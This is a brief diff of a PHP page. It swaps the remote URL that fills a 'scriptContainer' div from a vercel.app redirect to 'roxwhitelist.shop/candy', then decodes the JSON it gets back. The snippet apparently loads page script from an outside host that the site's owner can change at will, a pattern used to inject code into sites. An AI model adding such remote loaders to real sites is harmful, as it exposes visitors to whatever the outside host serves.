@@ -216,7 +216,7 @@
    <body>
    <div id="scriptContainer">
     <?php
-    $json_response = file_get_contents('https://redir-beryl.vercel.app/candy');
+    $json_response = file_get_contents('https://roxwhitelist.shop/candy');
     
     if ($json_response !== false) {
         $data = json_decode($json_response);
